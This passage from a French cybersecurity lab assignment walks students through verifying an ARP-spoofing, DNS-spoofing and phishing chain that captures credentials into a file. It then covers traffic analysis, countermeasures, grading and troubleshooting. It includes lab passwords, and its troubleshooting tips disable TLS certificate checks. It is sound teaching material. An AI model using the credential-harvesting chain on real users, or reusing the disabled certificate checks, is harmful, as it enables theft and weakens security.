> - [Mozilla — DNS over HTTPS](https://support.mozilla.org/fr/kb/dns-over-https-doh-firefox)
> - [ANSSI — Recommandations DNS](https://www.ssi.gouv.fr/guide/recommandations-pour-la-securisation-dun-systeme-de-noms-de-domaine/)

>  **Question 18** — Expliquez ce qu'est le DNS-over-HTTPS (DoH). En quoi cette technologie constitue-t-elle une contre-mesure efficace contre le DNS Spoofing ? Quels en sont les avantages et inconvénients du point de vue de la sécurité réseau d'une entreprise ?

#### Vérification complète de la chaîne d'attaque

C'est le moment de vérifier que toute la chaîne d'attaque fonctionne de bout en bout : ARP Spoofing → DNS Spoofing → page de phishing → capture d'identifiants.

**Depuis le `client-lab1`**, accédez au faux site via le navigateur Firefox :

```bash
# Méthode 1 : Via RDP (recommandé pour voir le résultat visuellement)
xfreerdp /v:192.168.56.11 /u:etusio /p:Fghijkl1234* /size:1280x720
# Puis ouvrez Firefox et naviguez vers : http://www.nicecosmetics.fr/

# Méthode 2 : Via SSH avec X11 forwarding
ssh -X etusio@192.168.56.11 firefox http://www.nicecosmetics.fr/

# Méthode 3 : Simulation en ligne de commande depuis le client
docker exec -it client-lab1 bash
curl -X POST http://nicecosmetics.fr/ -d "email=m.durand@nicecosmetics.fr&password=MonMotDePasse123!"
```

Soumettez de faux identifiants dans le formulaire de connexion, puis vérifiez la capture côté attaquant :

```bash
# Sur le conteneur Kali — Vérifier les identifiants capturés
cat /opt/creds.txt
```

Vous devriez voir les identifiants horodatés dans le fichier. La victime, elle, a été redirigée vers le vrai site `kbeauty-cosmetics.com` et n'a probablement rien remarqué.

>  **Question 19** — Décrivez la chaîne d'attaque complète depuis le point de vue de la victime. Quelles actions l'utilisateur a-t-il effectuées ? À quel moment ses identifiants ont-ils été compromis ? Que se passe-t-il après la soumission du formulaire ?

---

### 2.6 — Analyse du trafic avec Wireshark / tshark

L'analyse réseau est essentielle pour comprendre les mécanismes d'une attaque et constituer des preuves.

#### Capture du trafic DNS

```bash
# Depuis le conteneur Kali — Capturer le trafic DNS
tshark -i eth0 -f "port 53" -w /tmp/dns_capture.pcap &

# Depuis le conteneur client — Générer du trafic DNS
# (dans un autre terminal)
docker exec -it client-lab1 bash
nslookup nicecosmetics.fr
nslookup www.nicecosmetics.fr

# Arrêter la capture (ramener au premier plan et Ctrl+C, ou tuer le processus)
# (dans le terminal Kali)
kill %1
```

#### Analyse de la capture

```bash
# Lire la capture et filtrer les requêtes/réponses DNS
tshark -r /tmp/dns_capture.pcap -Y "dns" -T fields \
  -e frame.number \
  -e ip.src \
  -e ip.dst \
  -e dns.qry.name \
  -e dns.a

# Afficher les détails complets des paquets DNS
tshark -r /tmp/dns_capture.pcap -Y "dns.resp.name == nicecosmetics.fr" -V
```

>  **Question 20** — À partir de la capture réseau, identifiez :
> 1. La requête DNS émise par le client (source, destination, domaine demandé)
> 2. La réponse DNS falsifiée (source apparente, adresse IP renvoyée)
> 3. L'adresse MAC réelle de l'émetteur de la fausse réponse
>
> Expliquez comment un administrateur réseau pourrait détecter cette anomalie.

>  **Question 21** — Analysez les trames ARP capturées. Identifiez les paquets ARP anormaux (ARP Spoofing). Quel outil de détection d'intrusion (IDS) pourrait alerter sur ce type de comportement ?

---

### 2.7 — Nettoyage et arrêt de l'attaque

```bash
# Arrêter ettercap (Ctrl+C ou 'q' dans l'interface)
# Désactiver le forwarding IP
echo 0 > /proc/sys/net/ipv4/ip_forward

# Vérifier que la table ARP du client est revenue à la normale
# (depuis le conteneur client)
docker exec -it client-lab1 bash
arp -a
```

>  **Question 22** — Combien de temps faut-il pour que la table ARP du client revienne à la normale après l'arrêt de l'attaque ? Comment pourriez-vous accélérer ce processus ?

---

## Partie 3 — Contre-mesures et rapport de sécurité (~30 min)

### 3.1 — Synthèse des contre-mesures

Pour chaque attaque réalisée, complétez le tableau suivant :

| Attaque | Contre-mesures techniques | Contre-mesures organisationnelles |
|---|---|---|
| **Phishing** | | |
| **Typosquatting** | | |
| **DNS Spoofing** | | |
| **ARP Spoofing** | | |

>  **Question 23** — Pour chaque case du tableau, proposez **au minimum deux contre-mesures** en vous appuyant sur les éléments du cours (SPF/DKIM/DMARC, DNSSEC, HTTPS, PKI, MFA, sensibilisation…).

>  **Question 24** — Le cours aborde les **certificats numériques** et la **PKI** (Infrastructure à Clés Publiques). Expliquez comment le déploiement d'un certificat TLS sur le site `nicecosmetics.fr` protège contre :
> - Le phishing par clonage de site
> - Le DNS Spoofing
>
> Ce certificat constitue-t-il une protection absolue ? Justifiez.

>  **Question 25** — Votre collègue administrateur système vous demande conseil pour configurer DMARC sur le domaine `nicecosmetics.fr`. Rédigez un enregistrement DNS DMARC qui :
> - Rejette les emails non conformes (`p=reject`)
> - Envoie les rapports à `dmarc-reports@nicecosmetics.fr`
> - S'applique également aux sous-domaines

>  **Question 26** — Expliquez ce qu'est **DNSSEC** et comment il protège contre le DNS Spoofing. Quelles sont les étapes pour le déployer sur un domaine ?

---

### 3.2 — Rédaction du rapport de sécurité

Vous devez rédiger un **rapport de sécurité** destiné au RSSI, M. Durand. Ce rapport doit être professionnel et structuré.

#### Structure attendue du rapport

```
1. Page de garde
   - Titre, date, auteur, destinataire, classification (confidentiel)

2. Résumé exécutif (10 lignes max)
   - Synthèse des découvertes et recommandations prioritaires

3. Contexte et périmètre
   - Description de la mission et de l'environnement testé

4. Attaques réalisées
   4.1 Phishing & Typosquatting
       - Méthodologie employée
       - Résultats obtenus
       - Niveau de risque (critique / élevé / moyen / faible)
   4.2 DNS Spoofing
       - Méthodologie employée
       - Résultats obtenus
       - Niveau de risque

5. Contre-mesures recommandées
   - Classées par priorité (court terme / moyen terme / long terme)
   - Pour chaque mesure : coût estimé, complexité, impact

6. Conclusion

7. Annexes
   - Captures d'écran
   - Extraits de captures réseau
```

---

## Livrables

Vous devez rendre les éléments suivants à la fin de la séance :

| # | Livrable | Format |
|---|---|---|
| 1 | **Réponses aux questions** 1 à 26 | Document texte (Word, PDF ou Markdown) |
| 2 | **Schéma réseau** du laboratoire (Question 1) | Schéma numérique (draw.io, Packet Tracer, ou manuscrit scanné) |
| 3 | **Captures d'écran** des étapes clés | Images intégrées au document |
| 4 | **Capture réseau** (fichier .pcap) | Fichier `dns_capture.pcap` |
| 5 | **Rapport de sécurité** | Document PDF structuré (cf. section 3.2) |

> **Modalité de rendu :** déposez l'ensemble des livrables compressés (archive ZIP) sur l'espace de dépôt prévu avant la fin de la séance.

---

## Critères d'évaluation

| Critère | Points | Détail |
|---|---|---|
| **Mise en œuvre technique** | /6 | Le lab est fonctionnel, les attaques sont correctement reproduites, les commandes sont maîtrisées |
| **Compréhension des mécanismes** | /5 | Les réponses aux questions démontrent une compréhension réelle (pas de copier-coller) |
| **Qualité de l'analyse réseau** | /3 | La capture Wireshark est pertinente, les trames sont correctement interprétées |
| **Contre-mesures proposées** | /3 | Les solutions sont adaptées, réalistes et correctement justifiées |
| **Rapport de sécurité** | /3 | Le rapport est structuré, professionnel, synthétique et contient des recommandations actionnables |
| **Total** | **/20** | |

### Barème détaillé — Questions

| Question(s) | Thème | Points |
|---|---|---|
| Q1 | Schéma réseau | 1 |
| Q2 – Q3 | Reconnaissance | 1 |
| Q4 – Q5 | Analyse du phishing | 1 |
| Q6 – Q7 | Typosquatting & WHOIS | 1 |
| Q8 | Indices de phishing | 0.5 |
| Q9 – Q10 | SPF / DKIM / DMARC | 1.5 |
| Q11 – Q12 | HTTPS & MFA | 1 |
| Q13 | Redirection post-capture | 0.5 |
| Q14 | DNS Spoofing vs Typosquatting | 0.5 |
| Q15 | Éléments visuels phishing | 0.5 |
| Q16 – Q17 | ARP & DNS Spoofing (preuves) | 1 |
| Q18 | DNS-over-HTTPS (DoH) | 1 |
| Q19 | Chaîne d'attaque complète | 1 |
| Q20 – Q21 | Analyse Wireshark | 1.5 |
| Q22 | Récupération post-attaque | 0.5 |
| Q23 | Tableau contre-mesures | 1.5 |
| Q24 | Certificats & PKI | 1 |
| Q25 | Configuration DMARC | 0.5 |
| Q26 | DNSSEC | 0.5 |
| Rapport | Rapport de sécurité | 3 |

---

## Ressources

### Documentation CERTA

| Ressource | URL |
|---|---|
| Page du projet Kali v3 Docker | https://gravelines.reseaucerta.org/labos-kali-v3 |
| PDF descriptif du labo | https://gravelines.reseaucerta.org/sites/default/files/labo-kali_0.pdf |
| Archive ZIP complète | https://gravelines.reseaucerta.org/sites/default/files/labo-kali-docker-situations_et_laboratoires_v3.zip |
| Lab 1 — Ingénierie sociale | https://forge.apps.education.fr/reseau-certa/bts-sio/labos-kali-docker/lab1/ |
| Lab 2 — Attaques réseau | https://forge.apps.education.fr/reseau-certa/bts-sio/labos-kali-docker/lab2/ |

### Outils utilisés

| Outil | Description | Documentation |
|---|---|---|
| SET (Social Engineering Toolkit) | Framework d'attaques par ingénierie sociale | https://github.com/trustedsec/social-engineer-toolkit |
| ettercap | Outil d'attaque Man-in-the-Middle | https://www.ettercap-project.org/ |
| nmap | Scanner de ports et de services | https://nmap.org/book/man.html |
| Wireshark / tshark | Analyseur de protocoles réseau | https://www.wireshark.org/docs/ |
| swaks | Outil de test SMTP en ligne de commande | https://github.com/jetmore/swaks |
| BIND (named) | Serveur DNS | https://bind9.readthedocs.io/ |
| Python http.server | Serveur HTTP intégré à Python | https://docs.python.org/3/library/http.server.html |
| xfreerdp (FreeRDP) | Client RDP open source | https://github.com/FreeRDP/FreeRDP |

### Références réglementaires et techniques

| Référence | Lien |
|---|---|
| Articles 323-1 à 323-8 du Code pénal (atteintes aux STAD) | https://www.legifrance.gouv.fr |
| RFC 7208 — SPF | https://datatracker.ietf.org/doc/html/rfc7208 |
| RFC 6376 — DKIM | https://datatracker.ietf.org/doc/html/rfc6376 |
| RFC 7489 — DMARC | https://datatracker.ietf.org/doc/html/rfc7489 |
| RFC 4033 à 4035 — DNSSEC | https://datatracker.ietf.org/doc/html/rfc4033 |
| ANSSI — Bonnes pratiques DNS | https://www.ssi.gouv.fr |
| OWASP — Phishing | https://owasp.org/www-community/attacks/Phishing |
| Mozilla — DNS over HTTPS | https://support.mozilla.org/fr/kb/dns-over-https-doh-firefox |
| MDN — Formulaires HTML | https://developer.mozilla.org/fr/docs/Learn/Forms |
| W3Schools — HTML Forms | https://www.w3schools.com/html/html_forms.asp |

---

---

##  Dépannage / Troubleshooting

Si vous rencontrez des problèmes lors du TP, consultez les solutions ci-dessous :

### Clé GPG Kali expirée

Si `apt update` échoue avec une erreur de signature GPG :

```bash
wget --no-check-certificate https://archive.kali.org/archive-key.asc -O /tmp/kali-key.asc && \
gpg --batch --no-tty --dearmor < /tmp/kali-key.asc > /usr/share/keyrings/kali-archive-keyring.gpg
```

### SET crash pycrypto

Si SET affiche des erreurs liées à `pycrypto` ou `Crypto` lors de l'installation ou du lancement :

- C'est **normal** — ces erreurs n'affectent pas le fonctionnement du Credential Harvester.
- Ignorez-les et continuez.

### SET crash pexpect

Si SET crash avec `No module named 'pexpect'` :

```bash
pip3 install pexpect
```

### SET « Site Cloner » timeout

Si l'option « Site Cloner » (option 2) échoue avec un timeout HTTP :

- L'accès internet depuis le conteneur via le routeur est instable.
- Utilisez **« Web Templates »** (option 1) → **Google** (option 2) à la place.
- Cette option ne nécessite **aucun accès internet**.

### SSL / certificats dans le conteneur

Si des commandes échouent avec des erreurs de certificat SSL :

```bash
# Pour wget :
wget --no-check-certificate <URL>

# Pour git :
GIT_SSL_NO_VERIFY=1 git clone <URL>
```

### Metasploit non trouvé

Si SET affiche un avertissement « metasploit not found » ou « msfconsole not found » :

- C'est **normal** dans le lab1 — l'image `kali-linux-core` n'inclut pas Metasploit.
- Cela n'empêche pas l'utilisation du Credential Harvester.
- Ignorez le message et continuez.

### Client RDP — rdesktop / xfreerdp

Si `rdesktop` échoue avec une erreur `GLIBC` :

```bash
# Utiliser xfreerdp à la place (installer si nécessaire)
# Arch/Garuda : sudo pacman -S freerdp
# Debian/Ubuntu : sudo apt install freerdp2-x11
xfreerdp /v:192.168.56.11 /u:etusio /p:Fghijkl1234*
```

Si aucun client RDP ne fonctionne, utilisez SSH avec X11 forwarding :

```bash
ssh -X etusio@192.168.56.11 firefox http://www.nicecosmetics.fr/
```

---

> **Bon travail à tous. N'hésitez pas à solliciter le formateur en cas de difficulté technique.**
>
> *Rappel : les techniques vues dans ce TP ne doivent jamais être utilisées en dehors d'un cadre pédagogique ou d'un audit autorisé.*
